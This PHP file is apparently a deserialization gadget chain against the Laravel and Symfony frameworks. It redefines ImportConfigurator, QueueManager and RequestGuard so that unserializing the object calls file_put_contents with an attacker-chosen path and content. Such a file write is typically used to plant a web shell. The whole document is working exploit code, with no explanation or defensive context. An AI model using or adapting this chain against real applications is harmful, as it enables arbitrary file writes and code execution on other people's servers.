<?php
namespace Illuminate\Auth {
	class RequestGuard {
		protected $callback;
		protected $request;
		protected $provider;
		
		public function __construct($file, $data)
		{
			$this->callback = "file_put_contents";
			$this->request = $file;
			$this->provider = $data;
		}
	}
}

namespace Illuminate\Queue {
	class QueueManager
	{
		protected $app;
		protected $connectors;
		
		public function __construct($file, $data) {
			$this->app = [
				'config'=>[
					'queue.default'=>'aaa',
					'queue.connections.aaa'=>[
						'driver'=>'bbb'
					],
				]
			];
			
			$file = new \Illuminate\Auth\RequestGuard($file, $data);
			$this->connectors = [
				'bbb'=>[
					$file, "user"
				]
			];
		}
	}
}

namespace Symfony\Component\Routing\Loader\Configurator {
	class ImportConfigurator
	{
		private $parent;
		private $route;

		public function __construct($file, $data)
		{
			$this->parent = new \Illuminate\Queue\QueueManager($file, $data);
			$this->route = null;
		}
	}
}